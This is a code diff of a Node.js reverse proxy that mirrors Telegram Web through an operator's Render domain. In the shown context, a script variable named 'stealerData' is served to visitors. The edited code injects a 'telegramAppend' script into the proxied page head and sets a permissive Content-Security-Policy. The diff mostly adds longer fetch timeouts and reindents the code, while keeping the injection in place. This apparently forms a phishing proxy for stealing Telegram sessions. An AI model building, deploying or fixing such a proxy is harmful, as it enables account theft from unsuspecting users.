@@ -58,42 +58,51 @@ http.createServer(async (req, res) => {
                 res.write(`<script src="https://telegram.org/js/telegram-web-app.js"></script><script>${stealerData}</script>`);
                 return endResponseWithCode(res, 200);
             } else {
-                const headersEntries = Object.entries(req.headers);
-                const headers = new Headers();
-                for (let i = 0; i < headersEntries.length; i++) {
-                    const entry = headersEntries[i];
-                    headers.set(entry[0], entry[1].replaceAll("your-domain.com", "web.telegram.org")); // Update if needed
-                }
+    const headersEntries = Object.entries(req.headers);
+    const headers = new Headers();
+    for (let i = 0; i < headersEntries.length; i++) {
+        const entry = headersEntries[i];
+        headers.set(entry[0], entry[1].replaceAll("your-domain.com", "web.telegram.org")); // Update to your Render domain if needed
+    }
 
-                headers.set("Accept-Encoding", "br");
+    headers.set("Accept-Encoding", "br");
 
-                const r = await fetch(new Request("https://web.telegram.org/k" + req.url, {
-                    method: req.method,
-                    headers: headers,
-                    body: (req.method == "GET" || req.method == "HEAD") ? undefined : body
-                }));
+    // Fix: Custom Agent for longer timeouts (connect: 30s, headers/body: 60s)
+    const agent = new (require('undici').Agent)({
+        connect: { timeout: 30000 },  // 30 seconds for connection
+        headersTimeout: 60000,        // 60 seconds for headers
+        bodyTimeout: 60000            // 60 seconds for body (large pages)
+    });
 
-                if (!r.ok) throw new Error(`Fetch error: ${r.status}`);
+    const r = await fetch(new Request("https://web.telegram.org/k" + req.url, {
+        method: req.method,
+        headers: headers,
+        body: (req.method == "GET" || req.method == "HEAD") ? undefined : body,
+        dispatcher: agent  // Use the custom agent
+    }));
 
-                const resHeaders = new Headers(r.headers);
+    if (!r.ok) throw new Error(`Fetch error: ${r.status}`);
 
-                resHeaders.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
-                resHeaders.set('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline' your-domain.com");
-                resHeaders.set('CF-Cache-Status', 'DYNAMIC');
-                resHeaders.set('Pragma', 'no-cache');
-                resHeaders.set('Expires', '0');
+    // Rest of the code unchanged...
+    const resHeaders = new Headers(r.headers);
 
-                let writeBody = await r.arrayBuffer();
-                if (req.url == "/" || req.url.startsWith("/?")) {
-                    writeBody = new TextDecoder().decode(writeBody).replace('<head>', `<head><script src="https://telegram.org/js/telegram-web-app.js"></script><script>${telegramAppend}</script>`);
-                }
+    resHeaders.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+    resHeaders.set('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline' vk-pmmm.onrender.com"); // Updated to your domain
+    resHeaders.set('CF-Cache-Status', 'DYNAMIC');
+    resHeaders.set('Pragma', 'no-cache');
+    resHeaders.set('Expires', '0');
 
-                await getHeaderObjects(resHeaders, res);
+    let writeBody = await r.arrayBuffer();
+    if (req.url == "/" || req.url.startsWith("/?")) {
+        writeBody = new TextDecoder().decode(writeBody).replace('<head>', `<head><script src="https://telegram.org/js/telegram-web-app.js"></script><script>${telegramAppend}</script>`);
+    }
 
-                res.statusCode = r.status;
-                res.statusMessage = r.statusText;
-                return res.write(Buffer.from(writeBody), (_) => res.end());
-            }
+    await getHeaderObjects(resHeaders, res);
+
+    res.statusCode = r.status;
+    res.statusMessage = r.statusText;
+    return res.write(Buffer.from(writeBody), (_) => res.end());
+}
         } catch (err) {
             console.error("Server error:", err);
             endResponseWithCode(res, 500);
@@ -105,3 +114,4 @@ http.createServer(async (req, res) => {
 
 process.on("uncaughtException", console.error);
 process.on("unhandledRejection", console.error);
+
